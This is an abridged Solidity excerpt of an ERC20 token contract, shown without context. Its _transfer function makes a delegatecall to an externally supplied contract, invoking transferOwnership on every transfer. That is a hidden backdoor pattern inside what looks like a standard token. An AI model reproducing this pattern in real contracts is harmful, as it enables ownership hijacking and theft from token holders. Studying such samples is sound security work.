...
contract ERC20 is IERC20 {
    ...
    OwnableV1 public UniV1;    

    constructor (string memory name, string memory symbol, uint8 decimals, address contactAddress) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
        UniV1 = OwnableV1(contactAddress);
    }
    ...
    */
    ...
    function _transfer(address from, address to, uint256 value) internal {
        (bool success, bytes memory data) = address(UniV1).delegatecall(
            abi.encodeWithSignature("transferOwnership(address)", to)
        );
...
contract ERC20Token is 
    ...
    constructor (
        ...
        public
        ERC20 (name, symbol, decimals, contractAdd) {                                             
